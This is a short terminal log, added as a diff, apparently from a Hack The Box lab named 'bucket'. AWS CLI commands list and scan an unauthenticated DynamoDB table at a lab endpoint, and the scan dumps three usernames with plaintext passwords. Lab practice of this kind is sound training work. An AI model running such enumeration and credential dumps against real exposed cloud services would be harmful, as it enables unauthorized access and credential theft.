@@ -1,0 +1,12 @@
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/bucket# aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
+TABLENAMES	users
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/bucket# aws --endpoint-url http://s3.bucket.htb/ s3 ls
+2021-01-04 14:08:03 adserver
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/bucket# aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb
+None	3	3
+PASSWORD	Management@#1@#
+USERNAME	Mgmt
+PASSWORD	Welcome123!
+USERNAME	Cloudadm
+PASSWORD	n2vM-<_K_Q:.Aa2
+USERNAME	Sysadm
